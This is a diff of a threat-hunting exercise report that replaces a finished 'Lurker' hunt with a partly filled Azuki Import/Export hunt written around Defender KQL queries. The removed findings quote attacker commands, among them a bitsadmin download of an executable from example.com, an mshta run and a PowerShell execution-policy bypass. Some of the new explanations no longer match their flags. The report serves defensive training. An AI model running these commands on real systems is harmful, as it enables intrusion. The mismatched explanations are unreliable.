@@ -1,25 +1,25 @@
 # Threat-Hunting-Port-of-Entry-Jade-Spider-APT-
-INCIDENT BRIEF - Azuki Import/Export - 梓貿易株式会社 SITUATION: Competitor undercut our 6-year shipping contract by exactly 3%. Our supplier contracts and pricing data appeared on underground forums.  COMPANY: Azuki Import/Export Trading Co. - 23 employees, shipping logistics Japan/SE Asia  EVIDENCE AVAILABLE: Microsoft Defender for Endpoint logs
+INCIDENT BRIEF - Azuki Import/Export - 梓貿易株式会社 SITUATION:   COMPANY: Azuki Import/Export Trading Co. - 23 employees, shipping logistics Japan/SE Asia  EVIDENCE AVAILABLE: Microsoft Defender for Endpoint logs
 
 
 # 🕵️‍♀️ Threat Hunt Report: **Lurker**
 
-Analyst: Steven Cruz
+Analyst: Fredrick Wilson
 
-Date Completed: 2025-07-07
+Date Completed: 11/25/2025
 
-Environment Investigated: michaelvm, centralsrvr
+Environment Investigated: 
 
-Timeframe: June 14 – 18, 2025
+Timeframe: 11/20/2025
 
 ## 🧠 Scenario Overview
 
-What seemed like an isolated compromise may have been a smokescreen. An adversary has reemerged with improved evasion and more strategic objectives. This hunt follows a trail of suspicious PowerShell usage, financial document access, LOLBin abuse, and stealthy persistence across two systems: michaelvm and centralsrvr.
+Competitor undercut our 6-year shipping contract by exactly 3%. Our supplier contracts and pricing data appeared on underground forums.
 
 ---
 
 ## 🎯 Executive Summary
-The investigation revealed a multi-stage intrusion beginning with malicious PowerShell activity on michaelvm, followed by credentialed lateral movement to centralsrvr, culminating in data exfiltration to cloud services including Google Drive, Dropbox, and Pastebin. The adversary utilized LOLBins for stealth, registry and scheduled tasks for persistence, and evaded logging with PowerShell v2 and wevtutil log clearing.
+
 
 
 
@@ -29,191 +29,161 @@ The investigation revealed a multi-stage intrusion beginning with malicious Powe
 
 | Flag # | Objective | Value |
 |--------|-----------|-------|
-| **Start** | First suspicious machine | `michaelvm` |
-| **1** | First suspicious PowerShell execution | `"powershell.exe" -ExecutionPolicy Bypass -File "C:\Users\Mich34L_id\CorporateSim\Investments\Crypto\wallet_gen_0.ps1"` |
-| **2** | Recon binary hash (SHA256) | `badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0` |
-| **3** | Sensitive document accessed | `QuarterlyCryptoHoldings.docx` |
-| **4** | Last access timestamp | `2025-06-16T06:12:28.2856483Z` |
-| **5** | bitsadmin command | `"bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe"` |
-| **6** | Suspicious payload | `ledger_viewer.exe` |
-| **7** | mshta command | `"mshta.exe" C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta"` |
-| **8** | SHA1 of ADS payload | `801262e122db6a2e758962896f260b55bbd0136a` |
-| **9** | Registry autorun path | `HKEY_CURRENT_USER\S-1-5-21-2654874317-2279753822-948688439-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` |
-| **10** | Scheduled task name | `MarketHarvestJob` |
-| **11** | Lateral movement target | `centralsrvr` |
-| **12** | Lateral movement timestamp | `2025-06-17T03:00:49.525038Z` |
-| **13** | Targeted file hash (SHA256) | `b4f3a56312dd19064ca89756d96c6e47ca94ce021e36f818224e221754129e98` |
-| **14** | Exfiltration process MD5 | `2e5a8590cf6848968fc23de3fa1e25f1` |
-| **15** | Final exfil destination IP | `104.22.69.199` |
-| **16** | PowerShell downgrade timestamp | `2025-06-18T10:52:59.0847063Z` |
-| **17** | Log clearing timestamp | `2025-06-18T10:52:33.3030998Z` |
+| **Start** | 
+| **1** | 
+| **2** | 
+| **3** | 
+| **4** | 
+| **5** | 
+| **6** | 
+| **7** | 
+| **8** | 
+| **9** | 
+| **10** | 
+| **11** | 
+| **12** | 
+| **13** | 
+| **14** | 
+| **15** | 
+| **16** | |
+| **17** | 
 
 ---
 ## Flag by Flag
 
-### Starting Point – Identifying the Initial System
+### Starting Point – 
 
 **Objective:**
-Determine where to begin hunting based on provided indicators.
+
 
 **Intel Given:**
-- Activity duration: 2–3 days
 
-- Executables ran from the Temp directory
-
-- Timeframe centers around June 15, 2025
 
 **Identified System:**
 michaelvm
 
 **Reasoning:**
-Using the provided telemetry, michaelvm showed process execution from the Temp folder and matched the 2–3 day window:
 
-- First seen: 2025-06-14 15:38:45
 
-- Last seen: 2025-06-16 15:03:01
+- First seen: 
 
-This aligns with the operational timeline in question.
+- Last seen: 
+
+
 
 **KQL Query Used:**
 ```
 DeviceProcessEvents
-| where Timestamp between (datetime(2025-06-13) .. datetime(2025-06-17))
-| where ProcessCommandLine has @"\AppData\Local\Temp"
-| where ProcessCommandLine has "exe"
-| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, FolderPath, ProcessCommandLine, ReportId
-| summarize Count = count() by DeviceName
-| sort by Count desc
+
 ```
-<img width="327" height="763" alt="f098f6d9-0078-4330-bcf1-0cebd8431a66" src="https://github.com/user-attachments/assets/f99b60f6-4ed3-4991-a100-4319d8927c0a" />
-
-<img width="618" height="860" alt="d3647d80-ad50-4063-8049-6b41c24e5a59" src="https://github.com/user-attachments/assets/ada9a90a-05fe-430c-97fa-f5d585b999a1" />
 
 
-### 🪪 Flag 1 – Initial PowerShell Execution
+
+### 🪪 Flag 1 – INITIAL ACCESS - Remote Access Source
 
 **Objective:**
-Pinpoint the earliest suspicious PowerShell activity that marks the intruder’s possible entry.
+Remote Desktop Protocol connections leave network traces that identify the source of unauthorised access. Determining the origin helps with threat actor attribution and blocking ongoing attacks.
 
 **What to Hunt:**
-Look for .ps1 script executions via powershell.exe, especially from user directories or with bypass flags.
+Query logon events for interactive sessions from external sources during the incident timeframe.
 
 **Identified Activity:**
-"powershell.exe" -ExecutionPolicy Bypass -File "C:\Users\Mich34L_id\CorporateSim\Investments\Crypto\wallet_gen_0.ps1"
+88.97.178.12 is the source IP address of the Remote Desktop Protocol Connection
 
 **Why It Matters:**
 This PowerShell command represents the earliest deviation from baseline behavior on the compromised host michaelvm. The use of -ExecutionPolicy Bypass indicates a deliberate attempt to circumvent PowerShell script restrictions — a common tactic for initial payload deployment.
 
 **KQL Query Used:**
-```DeviceProcessEvents
-| where DeviceName == "michaelvm"
-| where ProcessCommandLine has ".ps1"
-| where ProcessCommandLine has @"C:\users"
-| project Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessFileName
-| sort by Timestamp asc
 ```
-<img width="1365" height="221" alt="20ce57f6-0f45-4047-889e-2f914630ae0e" src="https://github.com/user-attachments/assets/ef26ada3-0725-405b-a08d-069b5dfcac98" />
+DeviceLogonEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-18) .. datetime(2025-11-21))
+| where RemoteIP contains "."
+| where ActionType == "LogonSuccess"
+| project Timestamp, ActionType, AccountName,  RemoteIP, RemoteIPType, RemoteDeviceName
+| order by Timestamp asc
+```
+<img width="1739" height="382" alt="image" src="https://github.com/user-attachments/assets/0a155b6a-d56c-477c-9cf5-6f8f08e15e52" />
 
 
-### 🛰️ Flag 2 – Reconnaissance Script Hash
+
+### 🛰️ Flag 2 – INITIAL ACCESS - Compromised User Account
 
 **Objective:**
-Identify the reconnaissance-stage binary used by the attacker.
+Identifying which credentials were compromised determines the scope of unauthorised access and guides remediation efforts, including password resets and privilege reviews.
 
 **What to Hunt:**
-Execution of commands used to map out the environment, such as user/group enumeration.
+Focus on the account that authenticated during the suspicious remote access session. Cross-reference the logon event timestamp with the external IP connection.
 
-**Identified Artifact:**
-
-- Command:
-"cmd.exe" /c "net group \" Domain Admins\""
-
-- Initiating Process:
-powershell.exe
-
-- SHA256 Hash:
-badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
-
-- Timestamp:
-2025-06-16T05:56:59.4069248Z
+**Identified User Account:**
+kenji.sato
 
 **Why It Matters:**
-This command represents an attacker mapping privileged user groups — a classic recon step to identify targets for privilege escalation or lateral movement. The use of PowerShell to launch net group further suggests script-based automation.
+
 
 **KQL Query Used**
 ```
-DeviceProcessEvents
-| where DeviceName == "michaelvm"
-| where ProcessCommandLine has "net"
-| where ProcessCommandLine has "Domain"
-| project Timestamp, DeviceName, ProcessCommandLine, SHA256, InitiatingProcessFileName
-| sort by Timestamp asc
+DeviceLogonEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (datetime(2025-11-18) .. datetime(2025-11-21))
+| where RemoteIP contains "."
+| where ActionType == "LogonSuccess"
+| project Timestamp, ActionType, AccountName,  RemoteIP, RemoteIPType, RemoteDeviceName
+| order by Timestamp asc
 ```
-<img width="1462" height="184" alt="9ae6bc8f-29f2-4a58-9a1e-1cf42f9280c8" src="https://github.com/user-attachments/assets/ed4168d4-03b0-40bb-8bda-c32583d16069" />
+<img width="1739" height="382" alt="image" src="https://github.com/user-attachments/assets/346167c5-d6b6-4374-a139-d1db62b494b6" />
 
 
-### 📄 Flag 3 – Sensitive Document Access
+
+### 📄 Flag 3 – DISCOVERY - Network Reconnaissance
 
 **Objective:**
-Reveal the document that was accessed or staged by the attacker.
+Look for commands that reveal local network devices and their hardware addresses.
 
 **What to Hunt:**
-Look for file access involving keywords like board, financial, or crypto — especially in user folders.
+Look for file access involving keywords like board, financial, or crypto — especially in user folders. Check DeviceProcessEvents for network enumeration utilities executed after initial access.
 
-**Identified File:**
-
-- Filename: QuarterlyCryptoHoldings.docx
-
-- Folder Path: C:\Users\Mich34L_id\Documents\BoardMinutes
-
-- Device: michaelvm
+**Identified Command:**
+"ARP.EXE" -a
 
 **Why It Matters:**
-The filename and directory strongly suggest the document contains sensitive financial information. This access aligns with a financially motivated threat actor and signals clear intent to gather valuable data for exfiltration.
+
 
 **KQL Query Used:**
 ```
-DeviceEvents
-| where DeviceName == "michaelvm"
-| where ActionType contains "SensitiveFileRead"
-| where FolderPath contains "board"
-| project Timestamp, DeviceName, ActionType, FileName, FolderPath
+DeviceProcessEvents
+| where DeviceName == "azuki-sl"
+| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
+| project Timestamp, DeviceName, ProcessCommandLine, FolderPath, AccountName, IsProcessRemoteSession
 ```
-<img width="1147" height="270" alt="f1c7b00f-1655-453f-ba7a-2d21bf07712c" src="https://github.com/user-attachments/assets/dc7d25e6-489d-490b-af0e-5153400fc4a2" />
+<img width="1709" height="488" alt="image" src="https://github.com/user-attachments/assets/2321e140-cf3b-4c28-ae5a-91a90feb3a6c" />
 
 
-### ⏱️ Flag 4 – Last Manual Access to File
+
+### ⏱️ Flag 4 – DEFENCE EVASION - Malware Staging Directory
 
 **Objective:**
-Track the last read of the sensitive document to establish the exfiltration timeline.
+Attackers establish staging locations to organise tools and stolen data. Identifying these directories reveals the scope of compromise and helps locate additional malicious artefacts.
 
 **What to Hunt:**
-Look for the final SensitiveFileRead action tied to the previously identified file.
+Search for newly created directories in system folders that were subsequently hidden from normal view. Look for mkdir or New-Item commands followed by attrib commands that modify folder attributes.
 
-**Last Accessed File:**
-
-- Filename: QuarterlyCryptoHoldings.docx
-
-- Folder Path: C:\Users\Mich34L_id\Documents\BoardMinutes
-
-- Device: michaelvm
-
-- Timestamp: 2025-06-16T06:12:28.2856483Z
+**PRIMARY Staging Directory Found:**
+C:\ProgramData\WindowsCache
 
 **Why It Matters:**
-The document was last manually accessed just minutes before suspected payload activity and exfiltration, reinforcing its significance and timing in the attacker’s objective.
 
-**Note:** While the KQL results display the last read event as occurring on June 15, the actual UTC timestamp is June 16. This is due to time zone display settings in the hunting interface vs. the UTC-based timestamp values in KQL.
 
-**KQL Reference** (from previous flag):
+
+**KQL Query Used:**
 ```
-DeviceEvents
-| where DeviceName == "michaelvm"
-| where ActionType contains "SensitiveFileRead"
-| where FolderPath contains "board"
-| project Timestamp, DeviceName, ActionType, FileName, FolderPath
+DeviceFileEvents
+| where Timestamp between (startofday(datetime(2025-11-19)) .. endofday(datetime(2025-11-21)))
+| where DeviceName == "azuki-sl"
+| where InitiatingProcessFileName contains "powershell"
 ```
-<img width="798" height="41" alt="cf45ac7b-93f4-40fe-9e1f-b458b6fa583a" src="https://github.com/user-attachments/assets/9dc346d0-db81-4f34-af8c-846ddd3fffb6" />
+<img width="1679" height="432" alt="image" src="https://github.com/user-attachments/assets/1dd10cdd-be4d-4e5c-af6d-463cdd687371" />
+
 
 
 ### ⚙️ Flag 5 – LOLBin Usage: bitsadmin
